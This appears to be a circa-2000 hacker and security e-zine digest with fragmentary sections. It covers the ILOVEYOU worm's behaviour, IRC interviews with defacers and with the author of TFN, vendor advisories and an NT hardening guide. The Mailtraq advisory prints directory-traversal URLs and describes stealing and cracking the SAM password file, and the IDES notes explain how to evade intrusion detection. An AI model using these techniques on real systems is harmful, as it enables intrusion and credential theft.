     LOVE-LETTER-FOR-YOU.HTM file to any people that join a channel the
     client is in.
     
     You can find the source of the worm at:

     I-Worm.LoveLetter
     
     
      I-Worm.LoveLetter is Internet worm written in the scripting language "Visual Basic Script"
      (VBS). It works only on computers on which the Windows Scripting Host (WSH) is installed. In
      Windwos 98 and Windows 2000, WHS is installed by default. The worm performs destructive
      actions and sends its copy bye E-mail. 
     
      Destructive actions
     
      After starting from the VBS file the worm searches all files on all local and mapped network
      drivers. For some extensions of filenames the worm does the following: 
     
      VBS, VBE:
      Overwrites files with the worm body. 
     
      JS, JSE, CSS, VSH, HST, HTA:
      Creates a new file with original filename and extention .VBS and deletes original file. 
     
      JPG, JPEG:
      Creates new file with extention .VBS (adds this extention to old file name and extention) (i.e.
      PIC1.JPG.VBS). Writes worm body to it and deletes original file. 
     
      MP2, MP3:
      Creates a new file with extention .VBS (adds to old file name, see above for details). It writes
      its body to it and sets thef file attribute "hidden" to the original file. 
     
      MIRC32.EXE, MLINK32.EXE, SCRIPT.INI, MIRC.HLP, MIRC.INI: 
      If one of these files was found the worm creates the file SCRIPT.INI in the directory were one of
      the above files resides. 
     
      The worm also creates some files with its body in system directory. 
     
       MSKERNEL32.VBS, WIN32DLL.VBS, LOVE-LETTER-FOR-YOU.TXT.VBS
     
      It sets appropriates keys in the system registry (Automatic run keys) with full names of files: 
     
       MSKernel32.vbs, Win32DLL.vbs
     
      It adds system registry keys: 
     
      HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32 
     
      HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL
     
      Spreading via E-mail
     
      The worm sends itself via E-mail. To achieve this the worm sends itself to each address from
      address book. It works only when the email program Outlook 97/98/2000 is installed. 
     
      The letter's subject: 
     
       ILOVEYOU
     
      Message body: 
     
       kindly check the attached LOVELETTER coming from me.
     
      Attached file name: 
     
       LOVE-LETTER-FOR-YOU.TXT.vbs
     
      The virus creates a HTML dropper in Windows system directory. The HTML dropper displays
      the message: 
     
       This HTML file need ActiveX Control
       To Enable to read this HTML file
       - Please press 'YES' button to Enable ActiveX
     
      After this the dropper creates the MSKERNEL32.VBS with the worm body and sets it for auto
      execution from system registry.

      [21:28] <Da_Pest> I d liek to say something about him

      [21:28] <Da_Pest> sorry like
      [21:28] <SugarKing> go ahead:)
      [21:28] <Da_Pest> Ok

      [21:28] <p4ntera> yeah
      [21:29] <SugarKing> yeah I noticed
      [21:29] <SugarKing> aol kiddie
      [21:29] <p4ntera> he doesnt even know what NTLM authentication is
      [21:29] <p4ntera> or
      [21:29] <p4ntera> how he uses the everyone/guest group to hack with frontpage
      [21:29] <p4ntera> he just randomly tries sites
      [21:29] <Da_Pest> He dissed p4ntera and I meanwhile we have our own ideas of hax0ring whil he does absolutly frontpage
      [21:29] <p4ntera> which is pretty fucking lame
      [21:29] <Da_Pest> Ok
      [21:29] <Da_Pest> Go on attrition
      [21:29] <Da_Pest> and look at his hacks
      [21:29] <Da_Pest> Im pretty sure every one of them is NT
      [21:29] <p4ntera> nah thats not important
      [21:29] <SugarKing> yeah they are
      [21:29] <p4ntera> lets move on to something else
      [21:29] <SugarKing> i don't think he knows what linux is
      [21:30] <p4ntera> NT can be raped other ways
      [21:30] <Da_Pest> Yah
      [21:30] <p4ntera> as u saw with what i did

      [21:48] <SugarKing> btw, to set the record, since i'm logging and it's going to be posted
      [21:48] <SugarKing> I left this group because it was only defacing
      [21:49] <SugarKing> I didn't want to do it no more
      [21:49] <Da_Pest> Ok...
      [21:49] <SugarKing> I'll keep my opinion about defacing to myself
      [21:49] <Da_Pest> Why not?
      [21:49] <SugarKing> but, I'd rather code some nasty shit:)
      [21:49] <Da_Pest> ok gitcha
      [21:49] <Da_Pest> Alot of people dont like defacing
      [21:50] <Da_Pest> But the way I see it...
      [21:50] <SugarKing> I don't see a need for it
      [21:50] <Da_Pest> If you work fucking hard on a tight ass OBSD server and you been workin on it forever then I think you deserve the credit and so people can see your work

      [21:51] <p4ntera> yeah anyways

      [21:51] <p4ntera> when some of us gets booked
      [21:52] <p4ntera> or we own the world
      [21:52] <Da_Pest> LoL

      [21:52] <SugarKing> go ahead
      [21:52] <SugarKing> you got the floor:)
      [21:52] <Da_Pest> I will never stop hax0ring and if i do good work thhen I believe it should not go unnoticed
      [21:52] <p4ntera> you asked whats with the "underground aint dead part"
      [21:52] <SugarKing> ya
      [21:52] <p4ntera> well
      [21:52] <p4ntera> if u noticed last year
      [21:53] <p4ntera> groups like gH,irc.psychic.com and h4g15 were defacing major websites
      [21:53] <SugarKing> ya
      [21:53] <p4ntera> showing there weak security
      [21:53] <p4ntera> now we got people like "crime boys" and artech defacing websites
      [21:53] <Da_Pest> Exactly
      [21:53] <p4ntera> and these are the people that will protect potentially high up websites?
      [21:53] <p4ntera> i dont want my bank card protected by these frontpage kiddies
      [21:54] <Da_Pest> Ok course
      [21:54] <p4ntera> u know what i mean?
      [21:54] <SugarKing> yah
      [21:54] <Da_Pest> and the sad part is alot of admins are like that
      [21:54] <SugarKing> true in a sense
      [21:54] <p4ntera> yeah thats right they are
      [21:54] <Da_Pest> And i mean alot
      [21:54] <SugarKing> but what about groups like L0pht, who made their fame without defacing?
      [21:54] <p4ntera> well
      [21:54] <p4ntera> they were made in the 80's
      [21:54] <Da_Pest> Like look at all of artechs for god sakes
      [21:54] <p4ntera> when defacing was unheard of
      [21:55] <p4ntera> bbs hacking
      [21:55] <SugarKing> what about now?
      [21:55] <p4ntera> they did do the potentially "dark" side of hacking
      [21:55] <SugarKing> they could easily deface now
      [21:55] <p4ntera> yeah but they outgrown that
      [21:55] <p4ntera> its kind of a teenage thing
      [21:55] <SugarKing> so you saying you're gonna outgrow it?
      [21:55] <p4ntera> fuck when i heard mosthated was 19 i was shocked
      [21:55] <p4ntera> eventually
      [21:55] <SugarKing> heh
      [21:55] <SugarKing> ya
      [21:56] <Da_Pest> I dont think I will
      [21:56] <Da_Pest> until i get booked
      [21:56] <p4ntera> yeah he will
      [21:56] <p4ntera> heh
      [21:56] <p4ntera> anyways
      [21:56] <Da_Pest> Umm...
      [21:56] <Da_Pest> No
      [21:56] <SugarKing> in my last interview (team echo) one member said (remain nameless) hacking is something that just eventually progresses
      [21:56] <p4ntera> yeah
      [21:56] <SugarKing> which is true
      [21:56] <p4ntera> funny thing is
      [21:56] <Da_Pest> Tru dat
      [21:56] <p4ntera> we have 2 members of team echo
      [21:56] <p4ntera> in our group
      [21:56] <p4ntera> nameless of course
      [21:56] <SugarKing> ya I know
      [21:56] <Da_Pest> hehe =)
      [21:56] <p4ntera> well, had
      [21:56] <SugarKing> had?
      [21:56] <p4ntera> one got booked
      [21:56] <SugarKing> they left?
      [21:57] <SugarKing> who?
      [21:57] <p4ntera> another one is still in
      [21:57] <p4ntera> Analognet
      [21:57] <SugarKing> Analognet was in ph33r the b33r?
      [21:57] <p4ntera> yep
      [21:57] <Da_Pest> :)
      [21:57] <p4ntera> dont be so shocked
      [21:57] <SugarKing> i didn't know
      [21:57] <p4ntera> u know who taught him how to hack nt?
      [21:57] <p4ntera> your talking to him right now
      [21:57] <SugarKing> heh
      [21:57] <p4ntera> he learned very fast
      [21:57] <Da_Pest> p4ntera is truly 1337 sh1t lol
      [21:57] <p4ntera> within a month he knew what i knew
      [21:57] <Da_Pest> He taught me alot
      [21:58] <p4ntera> and became a nt admin
      [21:58] <p4ntera> damn right negro
      [21:58] <SugarKing> cool
      [21:58] <p4ntera> =)
      [21:58] <Da_Pest> I think as a group we are progressing
      [21:58] <p4ntera> i totally agree
      [21:58] <p4ntera> 100%
      [21:58] <SugarKing> so anything we should know about with the future of ph33r the b33r?
      [21:58] <p4ntera> yeah
      [21:58] <Da_Pest> We are slowly moving are way up to bigger and better things
      [21:58] <p4ntera> we are going to  be big
      [21:58] <p4ntera> as da_pest is saying
      [21:59] <Da_Pest> And eventually we are gonna pull a gH and own a big ass site
      [21:59] <p4ntera> we are the only thing that comes close to a good group
      [21:59] <p4ntera> of course
      [21:59] <Da_Pest> And that will be a grand finale
      [21:59] <p4ntera> my boys wkD are there with us
      [21:59] <Da_Pest> Yah
      [21:59] <SugarKing> oh yeah also...don't you think it's dangerous by just randomly pulling in people in the group who could possible be a fed?
      [21:59] <p4ntera> werd ka0x and BlazinWeed =)
      [21:59] <p4ntera> no
      [21:59] <p4ntera> i know my rights
      [21:59] <p4ntera> too well in fact
      [21:59] <Da_Pest> Same
      [21:59] <p4ntera> entrapment is a beautifal thing my friend
      [21:59] <p4ntera> =)
      [22:00] <Da_Pest> Plus we make sure people are legit before they join
      [22:00] <p4ntera> and thats why we hang on lame networks

      -------------------------------------------------------------------------
      **REVISED 01** HEWLETT-PACKARD COMPANY SECURITY BULLETIN: #00104, 21 Oct 99
      Last Revised: 2 May 2000
      -------------------------------------------------------------------------
      
      The information in the following Security Bulletin should be acted upon
      as soon as possible.  Hewlett-Packard Company will not be liable for any
      consequences to any customer resulting from customer's failure to fully
      implement instructions in this Security Bulletin as soon as possible.
      
      -------------------------------------------------------------------------
      PROBLEM:  automountd can run user programs as root.
      
      PLATFORM: HP-9000 Series 700/800 HP-UX releases 10.20 and 11.00.
      
      DAMAGE:   Allows users to gain root privileges
      
      SOLUTION: Apply the patches noted below.
      
      AVAILABILITY: Patches are now available.
      
      CHANGE SUMMARY: This revision contains patch information.
      -------------------------------------------------------------------------
      I.
         A. Background
            This problem was originally reported in CERT Advisory CA-99-05,
            regarding the vulnerability in automountd which allows an
            intruder to execute arbitrary commands with the privileges of
            the automountd process.
      
            We had previously reported that Hewlett-Packard platforms were
            not vulnerable; we now have new information showing that we
            are indeed vulnerable.
      
      **REVISED 01**
         B.| Fixing the problem
           |
           | For HP-UX release 11.00  apply             PHNE_20371,
           | for HP-UX release 10.20  apply             PHNE_20628.
           |
           | NOTE:  There are various patch dependencies associated with
           |        this patch, and rebooting is required.

      Mixter is the author of TFN (Tribe Flood Network) software which was
      recently brought into the limelight by Mafiaboy who used a variant called
      mstream to attack some big name web sites and effectively shut them down 
      for several hours.

      Session Start: Sun May 21 13:13:43 2000
      Session Ident: Mixter (mixter@*.net)
      [13:19] <Cruciphux> what inspired you to write the TFN software?
      [13:20] <Cruciphux> what where your goals, thoughts, intended uses
      [13:20] <Cruciphux> :
      [13:20] <Mixter> hmm
      [13:20] <Mixter> well, I coded it for the same purpose I code everything,
      because I simply like coding, and now or then you'll create something
      important
      [13:21] <Mixter> if not, coding something is always a new excercise for
      yourself...
      [13:21] <Cruciphux> you could code something but still not release it
      publically, was it merely POC or did you expect it to be used?
      [13:22] <Mixter> I've heard about these tools on irc like two years ago, at
      least that people wanted to create them
      [13:22] <Mixter> POC=? :)
      [13:22] <Mixter> sorry I spend way too little time in usenet etc.
      [13:22] <Cruciphux> Proof Of Concept
      [13:22] <Cruciphux> np
      [13:22] <Mixter> o
      [13:23] <Mixter> no, the first version was just a nice powerful tool to
      write up
      [13:23] <Cruciphux> what is your view on the Mafiaboy debacle and how do you
      feel about your software being used to attack major web sites?
      [13:24] <Mixter> it was interesting to see this concept worked, and you
      could contact hosts at a fast speed and with tunneling through raw packets
      and all
      [13:24] <Mixter> tfn2k, was however a pure POC.. any kiddie who tried to use
      it will know how buggy it is :)
      [13:25] <Cruciphux> can you explain the concept to us and how it works?
      [13:25] <Mixter> I think, when the government and media forces need
      something to puff out, they'll always find something
      [13:25] <Mixter> if it wasnt for the dos attacks, it wouldve been something
      else
      [13:26] <Mixter> I believe all packet kiddies out there should get a life...
      but they do more damage to irc servers and users than anything else, though
      [13:26] <Cruciphux> true but it was you that made the tool available, they
      may not otherwise have decided to attack these sites
      [13:27] <Cruciphux> do you feel responsible at all?
      [13:28] <Mixter> the plain concept of distributed attacks is to start
      processes from a lot of hosts, simple as that. in distributed packet
      flooding, you launch all processes against a single target. theoretically,
      before all the tools came out, when people just logged on to a lot of shells
      and run their udp/syn flooders against 1 target, that was the same stuff.
      what the new programs do, raw tunneling, or encrypted tcp control
      connections are just feature improvements to the same
      [13:28] <Mixter> that they have a big impact on feasibility and speed of
      distributed attacks and other things like distributed scanning
      [13:28] <Mixter> hm ok :)
      [13:29] <Mixter> its important to realize that the "authorities" biggest
      instrument is false guilt
      [13:30] <Mixter> people can't withdraw from it, and if they do, they're
      still being persecuted.. so I believe that people like mafiaboy arent
      innocent since they knew what they were doing, but simply sitting in front
      of your home computer and typing in commands can hardly make you a
      "criminal"
      [13:31] <Cruciphux> would you extend that view to "hacking" also?
      [13:31] <Cruciphux> whats your view on people who deface websites?
      [13:32] <Mixter> if you talk about hacking as in breaking into servers, I
      have no ethical problems with it as long as it is for the cause of improving
      the security, e.g. patching and/or notifying the people
      [13:33] <Cruciphux> so you are ok with non destructive intrusion so long as
      you patch the hole you came in through?
      [13:33] <Mixter> website defacements in general are destructive, because
      they can harm companies by destroying their images.. so it isnt something
      people should do.. exceptions are of course sites that stand for violation
      human and individual rights
      [13:33] <Cruciphux> what if the system is borrowed to say, host a bot on irc
      or launch further intrusion attempts?
      [13:34] <Cruciphux> yes I personally believe that socio-politcal defacements
      with a valid message are justifiable
      [13:34] <Mixter> well, I DONT recommend intrusion at all in these big
      brotherish times, it's far more easy to do productive, legal work, by
      working for a company or founding your own one, but lets say I have no
      problem with it, if no damage is created
      [13:35] <Cruciphux> what other software are you working on presently?
      [13:35] <Mixter> if they hack systems to host a bot, that's a pretty
      clueless and dangerous way... if they HAVE to intrude or if they dont have
      the small money, the only acceptable way is to contact the administration,
      notify them of the problem and ask for resources in exchange for securing
      their site
      [13:36] <Mixter> yeah.. it's pretty lame though, when you see some
      anti-human-rights site defaced, and you have in black on gray one line of
      text that says "pr0pz to muh brothers of the gibson h4xing cl4n"
      [13:36] <Mixter> ;/
      [13:37] <Cruciphux> considering the little cost involved in offering a
      hacker system resources in exchange for securing a server it seems strange
      it doesn't happen more often
      [13:37] <Mixter> well, security software, auditing software and more.. the
      problem is I can't disclose that without permission from my employees, and I
      wouldn't break my agreement
      [13:37] <Mixter> err employers
      [13:38] <Cruciphux> you currently are employed in the security field, were
      you ever a grey-hat?
      [13:38] <Cruciphux> i suppose thats a round about way of asking if you have
      hacked yourself in the past
      [13:38] <Mixter> yes it does.. but the whole thing is based on trust, and if
      it would become practice that hackers outline vulnerabilities and then get
      local access (from where they have LOTS of insider attacking possibilities),
      most people would have a problem trusting them
      [13:39] <Mixter> heh.. well yeah, I broke into hosts without permission in
      the past
      [13:39] <Cruciphux> trust is earned however and the notification of
      intrusion would be a demonstration of intent
      [13:39] <Mixter> at the beginning of my carreer, I started out with
      developing eggdrop/tcl (not for takeover, just for defense and fun for the
      most part)
      [13:39] <Cruciphux> how old are you?
      [13:40] <Mixter> that was 2 1/2 years ago.. I hadn't a clue about the legal
      issues back then, and wasn't even certain if what I was doing is illegal
      [13:42] <Mixter> ah, the notification of intrusion could also be used as a
      social engineering (<- stupid term :P) method, to get the trust, and then
      attack them from the inside with their consent :>
      [13:42] <Cruciphux> how did you get into computers? what was your intial
      exposure? first machine?
      [13:43] <Mixter> no, I don't care about that, after about 50 news agencies
      published name, address, birthdate, and photos of me back in february :P
      [13:43] <Cruciphux> k
      [13:45] <Cruciphux> how did you get into computers? what was your intial
      exposure? first machine?
      [13:46] <Mixter> my initial exposure was a c64 I used when I was about 6-8
      yrs old
      [13:46] <Mixter> i programmed a lot in basic, some machine language later :)
      [13:47] <Cruciphux> Are you self taught or do you have any official
      schooling in programming etc?
      [13:47] <Mixter> if people wouldnt all start with big PC OS's like windows,
      they'd probably figure out programming and the ins and outs of computing
      much better and faster...
      [13:47] <Cruciphux> yeah I started on a vic-20
      [13:47] <Cruciphux> wrote a bbs on it
      [13:47] <Cruciphux> it had 4k ram
      [13:47] <Mixter> oh well, the nice feds took away my computer back in 98
      [13:48] <Cruciphux> for what?
      [13:48] <Mixter> i hadnt had a pc for 3 months, that was when I read awful
      lots of programming, networking etc books and really got into the technical
      aspects
      [13:48] <Mixter> for installing some bots on a couple of hosts :]
      [13:48] <Cruciphux> *g*
      [13:49] <Cruciphux> thats about it really, thanks for yer time, any closing
      comments?
      [13:49] <Mixter> hey, nobody's perfect. I really *was* clueless about the
      tracing stealthing etc aspects of hacking, leave alone the legal stuff back
      then.. just exploring and doing anything I could :)
      [13:49] <Cruciphux> :-)
      [13:49] <Mixter> nope, if you dont have any closing questions ;)
      [13:49] <Cruciphux> when I sold my first c64 system, the guy that bought had
      nagged and nagged me
      [13:50] <Mixter> hehe
      [13:50] <Cruciphux> for some phreaking software i had, I finally gave in and
      let him have it warning him not to
      [13:50] <Cruciphux> actually use it unless he learned how it worked etc
      [13:50] <Cruciphux> he called me a week later
      [13:50] <Mixter> phreaking is something nice.. I really wish I could've done
      it in the time and/or country when it was feasible and not too dangerous
      [13:50] <Cruciphux> he was busted and had the $750 system confiscated
      [13:50] <Cruciphux> :)
      [13:51] <Mixter> aw :)
      [13:51] <Cruciphux> I was into it when I was younger
      [13:51] <Cruciphux> it was fun
      [13:51] <Mixter> i spent $3000 on my first PC
      [13:51] <Cruciphux> yeh same here
      [13:51] <Mixter> the one that got confiscated ;x
      [13:52] <Cruciphux> I paid $900 for a used 9M hard drive for my c64 bbs and
      $1000 for the USR 9600 external modem
      [13:52] <Cruciphux> heh
      [13:54] <Cruciphux> funny thinking about a 9 megabyte hard disk these days,
      it was the size of a ups
      [13:55] <Cruciphux> actually it might have been 7M
      [13:55] <Cruciphux> anyways we're all done i'll ttyl - thanks

                              WWW: www.netop.dk
                         Severity: Any user can browse and even download
                                   files from the remote computer
                           Author: axess ( axess@mail.com )
                         Homepage: www.b0f.com


       * Overview
          NetOp is a remote administrator control tool that allows you to capture
          the screen and it will act as if you were infront of it.
          Its a client / host based software. 
      
       * The Problem
          By default there is no account set up for verify that you are authorised to use
          the host software running on the server and anyone that has an client for it can
          access the screen.
          Default port 6502 is used.
          I have done a lot of testing of this and found out that most of the people running
          it dont use the accounts that can be set up to verify with an account and password
          that u are allowed to use the host.
          They rely on the NT security with locking the screen that should be enough.
          So if we log on we get a normal screen that says login with administrator account.
          Not easy to bypass, but then there is a function that you can use called file transfer.
          I use that method and a screen that looks like explorer will appear and you can download
          sam._ or what ever file you want and start cracking it while just bypassing all
          the NT security.          
  
       * Vulnerable Versions 
          Version 6 is the only one tested but i beleive all versions
          prior to that is vulnerable.
  
       * Fix
          6.5 has just been released and uses the NT security that will fix this problem.

                           Vendor: Fastraq Limited
                              WWW: www.mailtraq.com
                         Severity: Any user can browse and even download

       * Overview
              Mailtraq is a message server aimed at individuals, small and medium sized 
       companies and  home offices (SOHOS). Mailtraqs primary goal is to provide online 
       services to local users by  storing incoming and outgoing news and mail messages 
       offline, then connecting to the Internet at  controlled intervals to deliver 
       outgoing messages and collect and store incoming messages.  Mailtraq provides fully 
       featured Mail, News and Intranet services, full disk logging of all  activity, 
       comprehensive firewall  facilities plus many other services such as a Finger client, 
       Mail-to-News and News-To-Mail gateways, Web Administration, etc. Mailtraq requires
       either the Windows NT (Server or Workstation), Windows 95 or Windows 98 operating 
       systems to be running on the machine on which it is loaded. 
      
      
      
      
      
       * The Problem
              By default Mailtraq installs it's Webmail Administration menu which is 
       accessible via http://some.domain.com/$/admin . The problem accoured when We tried 
       to retrive http://some.domain.com/ We configured Mailtraq's WWW server root directory 
       to be C:\Program Files\Mailtraq\websys\webmail Since that \websys\webmail directory 
       doesn't contain index.html the server returned the complete file listing of the 
       directory C:\Program Files\Mailtraq\websys\webmail. So we tried to exploit this a 
       little bit, and discovered that anyone can browse and download files on the remote 
       computer running Mailtraq Mail Server. Here is how to exploit it: 
      
       http://127.0.0.1/./../../../
      
       And You should get the complete listing of of files in c:\Program Files\ . When We 
       tried to exploit this, we could only browse files from c:\Program Files\ . When we 
       would add some more /../../../ to the exsisting URL we would get a "404 Page not 
       found". We played around with this a little bit and found a way to exploit this too. 
       To get to windows we should add some more /../../../ but a correct directory name 
       was required. So we did it this way:
      
       http://127.0.0.1/../../../../../../../../../../././../../././..././.../.../windows/
      
       Here it is!!! The complete listing of C:\windows . Now this is as far as we go. 
       On Windows NT machines running Mailtraq You could just get sam._ , run l0phtcrack 
       against it and compromise the machine. 
      
       There is also a bug that allows the remote attacker to find out in what directory 
       is Mailtraq installed in. By inputing a large string after http://some.domain.com/
       the server will return the path to Mailtraq's installation directory. Exsample:
      
       http://127.0.0.1/../aaaaaaaaa[a lot of a's]aaaaaaa
      
       The output You should get will look like this:
      
       File "C:\Program Files\Mailtraq\websys\webmail\aaaaaa[a lot of a's]aaaaaa" could 
       not be found 
      
      
       
      
      
       * Vulnerable Versions
              We tested version 1.1.4. on Windows 98. All versions prior to 1.1.4 are 
       vulnerable. We aren't sure if the Windows NT version is affected.
       
      
       
      
       * Fix
              At this time we aren't familiar with any fix for this bug.

25.0 [b0f] ides.c:'Intrusion Detection Evasion System'
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
      /*
       *  ides version 0.3 - 'intrusion detection evasion system'
       *  (c) Jan 2000 by Mixter
       *
       *  IDES will go into background and watch incoming traffic, inserting forged
       *  TCP ack, rst and fin packets for every transmitted data packet. The sessions
       *  will not be affected, since the sequence numbers change, but all sniffing
       *  and monitoring software that evaluates raw packets is possibly tricked into
       *  evaluating the forged data or seeing reset connections, making logging
       *  unreliable or impossible. As a second feature, IDES will create a custom
       *  amount of fake SYNs on each valid tcp connection request, transparently
       *  simulating coordinated/decoy scans from random source addresses.
       *  IDES can be used on a remote host or locally to fool sniffers, IDS and
       *  other network monitors and to generate random decoy probes while scanning.
       *  Acknowledgements: MUCH of this idea is from stran9ers (private) code, which
       *  is better to configure, and from horizons article in Phrack 54.
       *
       *  Changes:
       *  v 0.3 - code sanitized, prevent generation of ACK storms/feedback loops
       *  v 0.2 - now uses a unique XOR (ph33r) challenge value for each process

       *                      (c) 2000 by Mixter
       *
       *  This tool just creates a recursive directory and file structure
       *  that contains purely random data, but is indistinguishable from a
       *  encrypted CFS directory, unless an extensive cryptanalysis is performed.
       *  This can be taken as a proof that a strange directory cannot easily be
       *  proven to actually contain encrypted data. May be useful against f3dz,
       *  just for decoy purposes, or to keep people from analyzing your
       *  cryptographic file systems structure. Distributed according to the GPL.

                              Windows NT Security Check Part II
                              =================================
      
      
      Introduction
      ------------
      
      In Part I of "Windows NT security Check" I explained some basic things about User accounts
      and Logging options. In this part I'll try to explain varius Groups and User rights. Please
      note that any of the topics provided in these articles can be discussed on our webboard
      located at http://net-security.org/webboard.htm
      
      Groups
      ------
      
      The membership of groups should be carefully evaluated. A group that is granted 
      permissions to sensitive files might contain users that should not have that access. 
      Open each group listed in the User Manager and inspect its members. 
      
      - Carefully evaluate the members of management groups such as Administrators, Server 
        Operators, Account Operators, Backup Operators, and Print Operators. Remove all 
        unnecessary accounts. 
      
      - Make sure that all administrative users have two accounts: one for administrative 
        tasks and one for regular use. Administrators should only use their administrative 
        accounts when absolutely necessary. 
      
      - Evaluate each global group membership and the resources that the group has access to. 
        Does the group have access in other domains? 
      
      - What folders and files do groups have permission to access? 
      
      - Do local groups hold global groups from other domains? Check the membership of these 
        global groups and make sure that no users have unnecessary access to resources in the 
        current domain
      
      
      The Administrator Account and Administrators Group
      --------------------------------------------------
      
      The Administrator account and Administrators group have unlimited rights on the system. 
      Therefore, you need to carefully evaluate the membership of the Administrators group 
      and take care of some other housekeeping related to the Administrator account: 
      
      - If you are taking over the management of an existing system, you should change the 
        Administrator account name and password immediately. You do not know who might have a 
        password that would give them access to the account. 
      
      - The Administrator account is often the target of attacks because of its well-known name. 
        You should rename the Administrator account to an obscure name and create a "decoy" 
        account called "Administrator" with no permissions. Intruders will attempt to break in 
        to this decoy account instead of the real account. 
      
      - Enable failed logons in the auditing system to detect attempts to log on to any account, 
        including Administrator. 
      
      - Look for unnecessary accounts that have Administrator status. Perhaps an intruder has 
        created such an account as a backdoor into the system. 
      
      The Administrators group has "Access this computer from network" right, which you can 
      block to prevent account hijacking or unauthorized activities. Without this right, 
      administrators must log on at the computer itself in a controlled environment to do any 
      administrative tasks. You will also need to remove the right from the Everyone group then 
      add back in accounts that are allowed to log on from network. 
      
      
      The Guest Account and Everyone Group 
      ------------------------------------
      
      Most administrators agree that it should be disabled, although removing it remove the 
      ability of anonymous users to access a system. If You decide to enable guest account 
      consider creating a separate domain for these public services where the Guest account 
      is enabled. Alternatively, use a Web server for this type of system. 
      
      - Users who log on as guests can access any shared folder that the Everyone group has 
        access to (i.e., if the Everyone group has Read permissions to the Private folder, 
        guests can access it with Read permissions). 
      
      - You don't know who Guest users are and there is no accountability because all guests 
        log in to the same account. 
      
      - If you have Microsoft Internet Information Server software installed, a special Guest 
        account called IUSR_computername exists with the rights to log on locally. Remove this 
        account if you don't want the general public to access your Web server. Users must then 
        have an account to access the Web server. 
      
      
      User rights
      -----------
      
      In the User Manager for Domains, check the rights that users and groups have on the 
      system. Choose User Rights from the Policies menu to display the User Rights Policy 
      dialog box. Initially, the box shows the basic rights. To evaluate all rights, click the 
      Show Advanced User Rights option. Here are some considerations for basic rights: 
      
      - Access this computer from the network
      
        By default, only the Administrators and the Everyone group have this right. Remove 
        the Everyone group (why would you want everyone to access this server from the network 
        if you are interested in security?), then add specific groups as appropriate. For 
        example, create a new group called "Network Users" with this right, then add users who 
        should have network access. 
      
      - Backup files and directories 
      
        User's with this right can potentially carry any files off-site. Carefully evaluate which 
        users and groups have this right. Also evaluate the Restore files and directories right. 
      
      - Log on locally 
      
        For servers, only administrators should have this right. No regular user ever needs 
        to logon directly to the server itself. By default, the administrative groups 
        (Administrators, Server Manager, etc.) have this right. Make sure that any user who is 
        a member of these groups has a separate management account. 
      
      - Manage auditing and security logs 
       
        Only the Administrators group should have this right.
      
      - Take ownership of files or other objects 
      
        Only the Administrators group should have this right. 
      
      
      Scan all the advanced rights to make sure that a user has not been granted rights 
      inappropriately.
       
      
      Files, Folders, Permissions and Shares
      --------------------------------------
       
      This discussion assumes that you are only using NTFS volumes on your servers. Do not 
      use FAT volumes in secure installations. 
      
      To check permissions on folders and other resources, you must go to each resource 
      individually to review which users and groups have permissions. This can be a 
      bewildering task, so for large systems obtain a copy of the Somarsoft DumpACL utility. 
      
      To open the Permissions dialog box for a folder or file, right-click it and choose 
      Properties, then click either the Sharing or the Security tab. The Sharing options 
      show who has access to the folder over the network. The Security tab has the Permission 
      and Auditing buttons so you can check local permissions or set auditing options. 
      
      Start your evaluation with the most sensitive and critical folders if you are doing 
      this procedure manually or performing a periodic checkup. Take care to do the following: 
      
       - Check each folder and/or file to determine which local users and groups have access 
         and whether that access is appropriate. 
      
       - Check all shared folders and the share permissions 
         on those folders to determine which network users and groups have access and whether 
         that access is appropriate. 
      
       - Program files and data files should be kept in separate folders to make management 
         and permission setting easier. Also, if users can copy files into a data folder, 
         remove the Execute permission on the folder to prevent someone from copying and 
         executing a virus or Trojan Horse program. 
      
       - Separate public files from private files so you can apply different permission sets. 
      
       - If users or groups have access to a folder, should they have the same access to 
         every file in the folder? To every subdirectory? Check the sensitivity of files and 
         attached subdirectories to evaluate whether inherited permissions are appropriate. 
      
       - Keep in mind that the Everyone group gets Full access by default for all new folders 
         you create. To prevent this, change the Everyone group's permission for a folder, 
         then any new subdirectories you create will get the new permission settings. 
         
       - If the server is connected to an untrusted network such as the Internet, do not 
         store any files on the server that are sensitive and for in-house access only. 
      
       - Never share the root directory of a drive or one of the drive icons that appears in the 
         graphical display. An exception would be sharing a Read Only CD-ROM drive for public 
         access.
       
       - For sensitive, password protected directories, enable Auditing. Right-click a folder, 
         click Security, then click Auditing and enable Failure to track users that are attempting 
         unauthorized access a folder or file. Note that File and Object access must be enabled 
         from the Audit Policies menu in the User Manager, as described later. 
      
       - Use encryption wherever possible to hide and protect files. Mergent 
        (http://www.mergent.com/) and RSA Data Systems (http://www.rsa.com/) provide encryption 
         software for this purpose. 
      
      You can remove Everyone's access to an entire folder tree by going to the root of the 
      drive, changing the permissions, and propagating those permissions to subdirectories. 
      Do not do this for the systemroot folder (usually C:\WINNT). You must manually update 
      Everyone's right there. 
      
      
      Virus and Trojan Horse Controls 
      -------------------------------
      
      Viruses are a particularly serious problem in the network environment because the client 
      computer can become infected, transferring the virus to server systems. Other users may come 
      into contact with infected files at the server. Evaluate and set the following options: 
      
       - Program directories should have permissions set to Read and Execute (not Write) to 
         prevent a virus from being written into a directory where it can be executed. To install 
         programs, temporarily set Write on, then remove it. 
      
       - Install new software on a separate, quarantined system for a test period, then install 
         the software on working systems once you have determined that it is safe to run. 
      
       - Public file sharing directories should have the least permissions possible, i.e., Read 
         Only, to prevent virus infections. 
      
       - If a user needs to put files on your server, create a "drop box" directory that has 
         only the Write permission. Check all new files placed in this directory with a virus 
         scanner. Implement backup policies and other protective measures. 
       
       - Educate and train users. 
      
       - Check the Symantec (<http://www.symantec.com/>) site for interesting papers on 
         Windows NT-specific virus issues. 
      
      
      Auditing and Event Logs 
      -----------------------
      
      Check the status of audit settings by choosing Audit on the Policies menu in the User 
      Manager for Domains. The Audit Policy dialog box appears. The settings in this box reflect 
      the minimum settings that are appropriate for auditing in most environments. Keep in mind 
      that auditing too many events can affect a system's performance. 
      
      Protect auditing and security logs from other administrators who might change or delete 
      them. You can grant only the Administrators group the ability to access the logs. To 
      restrict access to only one user (the "auditor"), remove all users except the auditor 
      from the Administrators group. This means all of your other administrators should be 
      members of a management group that does not have the "Manage auditing and security log" 
      right. 
      
      Check for failed logons in the Event Viewer. You can enable security auditing for logon 
      attempts, file and object access, use of user rights, account manage- ment, security 
      policy changes, restart and shutdown, and process tracking. 
      
      
      Backup
      ------
      
      Backup policies and procedures are essential. In your evaluation, determine which users 
